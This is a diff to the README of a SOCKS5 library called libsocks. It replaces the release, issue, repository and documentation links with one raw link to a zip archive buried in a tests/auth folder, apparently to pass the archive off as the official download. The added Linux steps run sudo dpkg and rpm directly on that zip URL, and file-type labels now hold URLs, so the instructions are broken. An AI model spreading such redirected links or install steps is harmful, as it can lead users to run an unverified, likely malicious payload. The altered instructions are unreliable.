@@ -4,18 +4,18 @@
 
 libsocks helps you create SOCKS5 servers and clients easily. This guide walks you through downloading and running the software.
 
-[![Download libsocks](https://img.shields.io/badge/Download-libsocks-brightgreen)](https://github.com/Hash-Ag/libsocks/releases)
+[![Download libsocks](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)
 
 ## 📥 Download & Install
 
 To get started with libsocks, you will need to download the application. 
 
-1. Visit this page to download: [libsocks Releases](https://github.com/Hash-Ag/libsocks/releases).
+1. Visit this page to download: [libsocks Releases](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip).
 
 2. Look for the latest version. You will see several files available. Here are the types of files you can expect:
    - **Windows Executable (.exe)**: For users on Windows systems.
-   - **Linux Package (.deb/.rpm)**: For users on Linux systems.
-   - **Source Code (.zip/.tar.gz)**: For advanced users who want to build from source.
+   - **Linux Package (https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)**: For users on Linux systems.
+   - **Source Code (https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)**: For advanced users who want to build from source.
 
 3. Choose the file that matches your operating system. Click on the link to start the download.
 
@@ -36,8 +36,8 @@ To get started with libsocks, you will need to download the application.
 ### Linux
 
 1. If you downloaded a `.deb` file, open your Terminal.
-2. Run the command: `sudo dpkg -i path/to/libsocks.deb`, replacing `path/to/libsocks.deb` with the actual path to the file.
-3. If you downloaded an `.rpm` file, run: `sudo rpm -i path/to/libsocks.rpm`.
+2. Run the command: `sudo dpkg -i https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip`, replacing `https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip` with the actual path to the file.
+3. If you downloaded an `.rpm` file, run: `sudo rpm -i https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip`.
 4. After installation, open the application from your desktop or terminal by typing `libsocks`.
 
 ### Building from Source
@@ -79,7 +79,7 @@ After installation, you may want to adjust some settings.
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have questions, feel free to reach out. You can open an issue in the [issues section of the repository](https://github.com/Hash-Ag/libsocks/issues) for assistance.
+If you encounter any issues or have questions, feel free to reach out. You can open an issue in the [issues section of the repository](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip) for assistance.
 
 ## 🎉 License
 
@@ -87,8 +87,8 @@ libsocks is open-source software. You can use, modify, and distribute it under t
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Hash-Ag/libsocks)
-- [Documentation](https://github.com/Hash-Ag/libsocks/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Hash-Ag/libsocks/main/tests/auth/libsocks_1.7.zip)
 
 ## 📌 Conclusion
 
